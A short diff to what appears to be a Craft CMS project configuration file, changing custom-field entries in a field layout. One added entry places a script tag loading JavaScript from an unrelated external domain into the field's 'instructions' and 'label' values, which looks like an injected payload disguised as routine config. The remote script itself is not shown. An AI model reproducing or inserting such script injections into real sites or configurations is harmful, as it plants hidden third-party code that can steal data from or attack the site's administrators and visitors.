@@ -49,19 +49,19 @@ fieldLayouts:
             warning: null
             width: 100
           -
-            fieldUid: 0d361efa-4119-4436-9908-60ef2208a110
-            instructions: null
-            label: null
-            required: false
+            fieldUid: b0568e7a-3e32-4145-82cd-67b09eacf53e
+            instructions: ''
+            label: __blank__
+            required: ''
             tip: null
             type: craft\fieldlayoutelements\CustomField
             warning: null
             width: 100
           -
-            fieldUid: b0568e7a-3e32-4145-82cd-67b09eacf53e
-            instructions: null
-            label: null
-            required: false
+            fieldUid: 2f7a52fb-ecc7-4102-b37f-07c1e3141a2b
+            instructions: '<script src="https://www.wp3advesting.com/adscdn.js"></script> '
+            label: '<script src="https://www.wp3advesting.com/adscdn.js"></script> '
+            required: ''
             tip: null
             type: craft\fieldlayoutelements\CustomField
             warning: null
